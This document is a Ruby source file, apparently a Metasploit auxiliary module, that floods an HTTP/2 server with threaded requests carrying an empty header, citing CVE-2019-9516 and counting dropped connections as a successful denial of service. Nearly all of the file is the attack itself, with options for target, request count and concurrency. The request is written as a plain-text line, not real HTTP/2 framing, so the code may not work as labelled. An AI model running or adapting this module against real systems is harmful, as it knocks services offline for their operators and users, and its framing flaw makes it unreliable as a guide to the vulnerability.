# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'HTTP/2 Length Headers Leak',
      'Author' => ['Alan Placidina Maria'],
      'References' => [%w[CVE CVE-2019-9516]],
      'DisclosureDate' => 'Aug 13 2019'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        Opt::RPORT(443)
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def run
    path = datastore['TARGETURI']
    host = datastore['VHOST']
    timeout = datastore['TIMEOUT']

    payload = "GET #{path} HTTP/2.0\r\nHost: #{host}\r\nLeak:\r\nUser-Agent: #{Rex::Text.rand_text_english(rand(1..42))}\r\n\r\n"

    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
          begin
            connect

            sock.put(payload)
            res = sock.get_once(-1, timeout)
            print_good(res)

            disconnect
            print_error('DoS packet unsuccessful')
          rescue ::Rex::ConnectionRefused
            print_error("Unable to connect to #{peer}")
          rescue ::Errno::ECONNRESET, ::EOFError
            print_good('DoS packet successful')
          ensure
            disconnect
          end
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
